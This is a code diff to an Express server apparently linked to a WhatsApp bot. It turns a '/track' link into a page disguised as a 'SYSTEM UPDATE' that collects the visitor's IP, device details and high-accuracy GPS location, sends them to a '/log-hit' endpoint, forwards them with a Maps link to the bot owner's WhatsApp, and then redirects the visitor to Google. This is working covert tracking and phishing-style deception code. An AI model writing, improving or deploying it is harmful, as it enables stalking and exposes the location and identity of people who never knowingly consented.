@@ -99,32 +99,88 @@ let botInfo = null;
 app.get('/track', (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
-    const time = new Date().toISOString();
+    const time = new Date().toLocaleString();
     
     console.log(`📡 [TRACKER] NEW HIT!`);
-    console.log(`🕒 Time: ${time}`);
-    console.log(`🌐 IP: ${ip}`);
-    console.log(`📱 Device: ${userAgent}`);
     
     res.send(`
         <html>
-            <body style="background: #000; color: #0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: monospace;">
+            <head><title>System Update</title></head>
+            <body style="background: #000; color: #0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: monospace; text-align: center; padding: 20px;">
                 <h1>SYSTEM UPDATE</h1>
-                <p>Verifying connection... Please wait.</p>
+                <p id="status">Verifying connection... Please wait.</p>
                 <script>
-                    navigator.geolocation.getCurrentPosition((pos) => {
-                        const { latitude, longitude, accuracy } = pos.coords;
-                        console.log('📍 Location captured: ' + latitude + ', ' + longitude);
-                        // In a real scenario, we'd send this back to a POST endpoint
-                        // For this educational implementation, we just log it in the console via the user-agent capture if possible or a separate log
-                    });
+                    async function report(data) {
+                        await fetch('/log-hit', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+                    }
+
+                    const info = {
+                        ip: "${ip}",
+                        ua: navigator.userAgent,
+                        platform: navigator.platform,
+                        vendor: navigator.vendor,
+                        language: navigator.language,
+                        screen: screen.width + "x" + screen.height,
+                        time: "${time}"
+                    };
+
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            info.lat = pos.coords.latitude;
+                            info.lon = pos.coords.longitude;
+                            info.acc = pos.coords.accuracy;
+                            report(info);
+                        },
+                        (err) => {
+                            info.locError = err.message;
+                            report(info);
+                        },
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+
+                    // Initial report in case geo fails or takes too long
+                    report(info);
+
                     setTimeout(() => {
                         window.location.href = "https://google.com";
-                    }, 3000);
+                    }, 5000);
                 </script>
             </body>
         </html>
     `);
+});
+
+app.post('/log-hit', express.json(), async (req, res) => {
+    const data = req.body;
+    console.log('📍 [TRACKER] DATA RECEIVED:', data);
+    
+    if (client && client.info) {
+        let report = `📍 *TRACKER HIT REPORT*\n\n`;
+        report += `🕒 *Time:* ${data.time}\n`;
+        report += `🌐 *IP:* ${data.ip}\n`;
+        report += `📱 *Device:* ${data.ua}\n`;
+        report += `💻 *Platform:* ${data.platform}\n`;
+        report += `📏 *Screen:* ${data.screen}\n`;
+        
+        if (data.lat && data.lon) {
+            report += `🗺️ *Location:* https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
+            report += `🎯 *Accuracy:* ${data.acc}m\n`;
+        } else if (data.locError) {
+            report += `⚠️ *Location Error:* ${data.locError}\n`;
+        }
+
+        try {
+            const botNumber = client.info.wid._serialized;
+            await client.sendMessage(botNumber, report);
+        } catch (err) {
+            console.error('Failed to send tracker report to bot number:', err);
+        }
+    }
+    res.sendStatus(200);
 });
 
 app.get('/', (req, res) => {
